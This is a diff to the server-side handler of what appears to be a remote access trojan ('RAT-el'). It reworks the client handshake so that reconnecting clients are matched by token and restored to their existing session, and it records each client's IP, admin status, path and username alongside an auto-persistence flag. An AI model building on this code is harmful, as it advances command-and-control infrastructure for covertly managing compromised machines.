@@ -6,7 +6,7 @@ import os
 import binascii
 from .other import printColor
 from .sql import Sql
-from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN, SOCK_TIMEOUT
+from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN, SOCK_TIMEOUT, SPLIT 
 
 
 
@@ -176,45 +176,59 @@ The client first sends this information, then the server sends the parameters as
     def recvFirstInfo(self):
         #Collect informations with Handshake client.
         #if the client sends MOD_RECONNECT it means that the client tries to reconnect, to be sure the client sends a tokken.
+        #If the client tries to reconnect this function returns a tuple containing (True and the number of sessions).
+
         list_info = []
+        already_in_the_dictionary = False
+        
         while True:
             data = self.recvUltraSafe()
             print(data)
             if(data == "\r\n"):
                 print("Stop recvFirstInfo")
                 break
+
+            tmp = data.split(SPLIT)
             
-            if(data=="MOD_RECONNECT"): #A changer ! MOD_RECONNECT True | TOKEN fdsafafsdfsadf3454sdfasdf5
-                #print("IN MOD RECONNECT (recv Frist Info)")
-                token = self.recvUltraSafe()
-                if bool(Handler.dict_conn):
-                    print(token)
+            print("0 -->",tmp[0])
+            print("1 -->",tmp[1])
+
+            if(tmp[0]=="MOD_RECONNECT"): #A changer ! MOD_RECONNECT True | TOKEN fdsafafsdfsadf3454sdfasdf5
+                print("MOD RECONNECT DETECT")
+                token = tmp[1]
+                print("Token recv->", token)
+                if bool(Handler.dict_conn): 
                     for value in Handler.dict_conn.values():
                         print(value[NB_TOKEN])
-                        if(value[NB_TOKEN] == token): 
-                            print("Token doublon")
-                            break
+                        if(value[NB_TOKEN] == token): #if the token is already in the dictionary it means that the client is trying to reconnect. This information is thus well stored in the db.
+                            print("!!!!Token doublon!!!!")
+                            already_in_the_dictionary = True
+                            nb_session_of_conn = value[NB_SESSION]
 
                 else:
                     print("dict empty")
-            else:       
-                
-                tmp = data.split("|")
+            else:
                 list_info.append(tmp[1])
+
+        if(already_in_the_dictionary):
+            tpl = already_in_the_dictionary, nb_session_of_conn
+            #print("_______",type(tpl))
+            return tuple(tpl)
         
-        return list_info
+        else:
+            return list_info
 
 
     def sendParameterOfClient(self,token):
         if(self.auto_persistence):
-            self.sendUltraSafe("MOD_HANDSHAKE_AUTO_PERSISTENCE | True")
+            self.sendUltraSafe("MOD_HANDSHAKE_AUTO_PERSISTENCE"+SPLIT+"True")
             #print(" SEND MOD_HANDSHAKE_AUTO_PERSISTENCE | True")
 
         else:
-            self.sendUltraSafe("MOD_HANDSHAKE_AUTO_PERSISTENCE | False")
+            self.sendUltraSafe("MOD_HANDSHAKE_AUTO_PERSISTENCE"+SPLIT+"False")
             #print("SEND MOD_HANDSHAKE_AUTO_PERSISTENCE | False")
 
-        self.sendUltraSafe("MOD_HANDSHAKE_TOKEN | " + token)        
+        self.sendUltraSafe("MOD_HANDSHAKE_TOKEN"+SPLIT+token)        
         #print("SEND TOKEN")
         #time.sleep(0.3)
         self.sendUltraSafe("\r\n") #end echange.
@@ -224,19 +238,41 @@ The client first sends this information, then the server sends the parameters as
     def run(self):
 
         self.ObjSql.createDb()
-        list_info = self.recvFirstInfo() #Collect informations with Handshake client. #1
-        if(bool(list_info)):
+        info = self.recvFirstInfo() #Collect informations with Handshake client. #1
+        
+        print("test in info ->",info)
+        #print("test in info ->",len(info))
+        print("test in info ->",type(info))
+        if(bool(info)):#if not empty
             #print("sencode part persi go !!!! ")
-            token = self.generateToken()
-            self.sendParameterOfClient(token) #2
+            if type(info) == list:
+                token = self.generateToken()
+                self.sendParameterOfClient(token) #2
 
-            if(self.ObjSql.checkFileExists("sql/RAT-el.sqlite3")):
-                self.ObjSql.insertInDatabase(Handler.number_conn ,self.address[0], int(self.address[1]), True, list_info[0], list_info[1], list_info[2],token)
-                #print("IP IN DATABASE IS: ", self.ObjSql.returnValue(Handler.number_conn, "socket"))
+                if(self.ObjSql.checkFileExists("sql/RAT-el.sqlite3")):
+                    self.ObjSql.insertInDatabase(Handler.number_conn ,self.address[0], int(self.address[1]), True, info[0], info[1], info[2],token)
+                    #print("IP IN DATABASE IS: ", self.ObjSql.returnValue(Handler.number_conn, "socket"))
 
-            Handler.dict_conn[Handler.number_conn] = [Handler.number_conn,self.conn, self.address[0], int(self.address[1]), True, list_info[0], list_info[1], list_info[2]] #3 #True = Connexion is life 
-            Handler.number_conn+=1 #4
-            #print("type of dict_conn ----->",type(Handler.dict_conn))
+                Handler.dict_conn[Handler.number_conn] = [Handler.number_conn,self.conn, self.address[0], int(self.address[1]), True, info[0], info[1], info[2],token] #3 #True = Connexion is life 
+                Handler.number_conn+=1 #4
+                #print("type of dict_conn ----->",type(Handler.dict_conn))
+        
+            if type(info) == tuple:#If the customer tries to reconnect: | return Bool
+                print("Reconnect change dict.")
+                nb_session = info[1]
+
+                #Session number does not change value
+                Handler.dict_conn[nb_session][NB_SOCKET] = self.conn
+                Handler.dict_conn[nb_session][NB_IP] = self.address[0]
+                Handler.dict_conn[nb_session][NB_PORT] =  int(self.address[1])
+                Handler.dict_conn[nb_session][NB_ALIVE] =  True
+                #is admin does not change value
+                #path does not change value
+                #username does not change value
+                #The token does not change value
+
+                
+
         else:
             #if empty,  ignore. If the list is empty, it means that the client sent a mod_reconnect.
             pass 
